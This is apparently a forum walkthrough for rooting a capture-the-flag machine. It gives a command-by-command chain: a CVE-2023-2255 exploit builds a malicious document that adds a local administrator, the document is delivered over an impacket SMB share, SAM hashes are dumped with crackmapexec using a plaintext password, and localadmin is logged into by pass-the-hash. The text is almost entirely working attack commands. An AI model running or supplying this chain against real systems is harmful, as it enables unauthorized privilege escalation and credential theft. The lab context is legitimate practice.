For those that haven't rooted:  
  
git clone [https://github.com/elweth-sec/CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255)  
  
python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'  
  
> Start SMB Server  
impacket-smbserver mailing `pwd` -smb2support  
  
> copy file to C:\Important Documents  
net use \\<ip>\mailing  
copy \\<ip>\mailing\exploit.odt  
  
> wait a few seconds then confirm maya is an admin  
net user maya  
  
>dump sam hash  
crackmapexec smb <box-ip> -u maya -p "m4y4ngs4ri" --sam  
  
> auth with localadmin hashes  
impacket-wmiexec localadmin@<box-ip> -hashes "<hashes>"